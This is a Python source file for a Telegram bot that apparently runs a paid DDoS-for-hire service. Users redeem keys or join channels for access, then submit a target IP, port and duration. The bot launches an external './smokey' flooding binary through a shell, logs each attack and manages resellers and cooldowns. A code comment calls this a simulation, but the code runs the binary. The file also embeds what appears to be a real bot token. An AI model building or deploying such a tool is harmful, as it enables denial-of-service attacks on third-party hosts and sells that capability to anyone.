import os
import json
import time
import subprocess
import threading
import telebot
import datetime
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('7622141135:AAGQNf7x1n7pkV1jmRS6xNV1PKs0NSMpPs0')

# Admin user IDs
admin_id = {"6864281179"}
# Channel ID to send feedback screenshots
feedback_channel_id = '@VOID_CHATS'  # Use the actual channel username with @ or channel ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# In-memory storage
users = {}
keys = {}
resellers = {}
last_attack_time = {}
temporary_access = {}

# Required channels for attack verification
REQUIRED_CHANNELS = [
    "https://t.me/+r07ItJyMqdtkN2Y9",  # Replace with your actual channel links
    "https://t.me/VOID_CHATS"
]

MAX_ATTACK_USES = 10  # Maximum allowed attacks for temporary access

def load_data():
    global users, keys, resellers, temporary_access
    users = read_users()
    keys = read_keys()
    resellers = load_resellers()
    temporary_access = load_temporary_access()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_resellers(resellers_data):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers_data, file, indent=4)

def load_temporary_access():
    try:
        with open("temporary_access.json", "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_temporary_access():
    with open("temporary_access.json", "w") as file:
        json.dump(temporary_access, file)

def log_command(user_id, target, port, duration):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] UserID: {user_id}, Target: {target}:{port}, Duration: {duration}s\n"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry)

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "Logs cleared successfully."
    except FileNotFoundError:
        return "No data found."

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    feedback_button = types.KeyboardButton("📸 Send Feedback")
    markup.add(attack_button, myinfo_button, redeem_button, feedback_button)

    bot.reply_to(message, "*Welcome to the bot!*\n\n*Select an option below to get started.*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    # Check if user has VIP access or temporary access
    if user_id not in users and not has_temporary_access(user_id):
        bot.reply_to(message, "⚠️ *Please redeem a key or join the required channels to gain access.*", parse_mode='Markdown')
        return

    expiration_date = users.get(user_id, None)
    if expiration_date and datetime.datetime.now() > datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S'):
        bot.reply_to(message, "❗️*Your access has expired. Please redeem a new key.*", parse_mode='Markdown')
        return

    # Check cooldown period
    if user_id in last_attack_time:
        time_since_last = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
        if time_since_last < 120:  # 2 minutes cooldown
            remaining = 120 - time_since_last
            bot.reply_to(message, f"⌛️ *Cooldown active. Wait {int(remaining)} seconds.*", parse_mode='Markdown')
            return

    bot.reply_to(message, "Enter target IP, port, and duration in seconds (e.g., '192.168.1.1 80 60')", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_details)

def has_temporary_access(user_id):
    if user_id in temporary_access:
        if temporary_access[user_id] < MAX_ATTACK_USES:
            return True
        else:
            del temporary_access[user_id]  # Remove access after limit is reached
            save_temporary_access()
    return False

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) != 3:
        bot.reply_to(message, "Invalid format. Please provide target IP, port, and duration.", parse_mode='Markdown')
        return

    target, port_str, duration_str = details
    try:
        port = int(port_str)
        duration = int(duration_str)
    except ValueError:
        bot.reply_to(message, "Invalid port or duration. Please use numeric values.", parse_mode='Markdown')
        return

    if duration > 239:
        bot.reply_to(message, "❗️Error: Duration must be less than 240 seconds.", parse_mode='Markdown')
        return

    if not is_valid_ip(target):
        bot.reply_to(message, "❗️Error: Invalid IP address format.", parse_mode='Markdown')
        return

    if port < 1 or port > 65535:
        bot.reply_to(message, "❗️Error: Port must be between 1 and 65535.", parse_mode='Markdown')
        return

    # Record the attack
    log_command(user_id, target, port, duration)
    last_attack_time[user_id] = datetime.datetime.now()

    # Use up one temporary access if applicable
    if user_id in temporary_access:
        temporary_access[user_id] += 1
        save_temporary_access()

    # Simulate attack (replace with actual attack logic)
    attack_command = f"./smokey {target} {port} {duration} 1800"
    subprocess.Popen(attack_command, shell=True)

    # Notify user
    bot.reply_to(message, f"🚀 *Attack initiated on {target}:{port} for {duration} seconds.*", parse_mode='Markdown')

    # Schedule completion message
    threading.Timer(duration, send_attack_completion, args=[message.chat.id, target, port]).start()

def send_attack_completion(chat_id, target, port):
    bot.send_message(chat_id, f"✅ *Attack on {target}:{port} has completed.*", parse_mode='Markdown')

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    if user_id in admin_id:
        role = "Admin"
        key_expiration = "Lifetime"
    elif user_id in resellers:
        role = "Reseller"
        key_expiration = "N/A"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
    elif user_id in temporary_access:
        role = "Temporary User"
        key_expiration = f"{MAX_ATTACK_USES - temporary_access[user_id]} uses left"
    else:
        role = "Guest"
        key_expiration = "No active key"

    response = (
        f"👤 *User Info* 👤\n\n"
        f"ℹ️ *Username:* @{username}\n"
        f"🆔 *UserID:* {user_id}\n"
        f"🚹 *Role:* {role}\n"
        f"📅 *Key Expiration:* {key_expiration}\n"
    )

    if user_id in resellers:
        balance = resellers[user_id]
        response += f"💰 *Balance:* {balance} Rs\n"

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "📸 Send Feedback")
def send_feedback(message):
    bot.reply_to(message, "📸 *Please send your feedback screenshot.*", parse_mode='Markdown')

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    # Forward the received screenshot to the specified channel
    bot.forward_message(feedback_channel_id, message.chat.id, message.message_id)
    bot.reply_to(message, "✅ *Your feedback has been sent. Thank you!*", parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⚠️ Access denied: Only the bot owner can run this command.", parse_mode='Markdown')
        return

    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>", parse_mode='Markdown')
        return

    broadcast_msg = parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | admin_id

    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *Broadcast Message :*\n\n*{broadcast_msg}*", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"Error sending message to {user}: {e}")

    bot.reply_to(message, f"📢 Broadcast sent to {sent_count} users.", parse_mode='Markdown')

if __name__ == "__main__":
    load_data()
    bot.polling(none_stop=True)